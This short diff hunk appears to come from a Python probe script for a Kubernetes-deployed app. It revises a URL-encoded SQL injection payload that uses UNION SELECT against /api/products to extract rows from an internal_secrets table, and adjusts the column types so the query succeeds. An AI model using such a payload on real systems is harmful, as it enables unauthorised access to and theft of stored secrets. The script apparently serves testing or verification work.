@@ -59,8 +59,8 @@ def _logs(deploy: str, ns: str, *, since: str, kubeconfig: str | None) -> list[s
 
 
 # ───────────── probe: 자백 유발(임시 파드) ─────────────
-_SQLI = ("/api/products?q=%27%20UNION%20SELECT%20key%2Cvalue%2Cnote%2C%27%27%2C%27%27"
-         "%20FROM%20internal_secrets--")   # UNION 으로 internal_secrets 추출
+_SQLI = ("/api/products?q=%27%20UNION%20SELECT%201%2Cvalue%2Cnote%2C0%2C0"
+         "%20FROM%20internal_secrets--")   # UNION(타입 맞춤: 1열 id=1·price/stock=0) internal_secrets 추출
 
 
 def _probe_app(ns: str, kubeconfig: str | None) -> None:
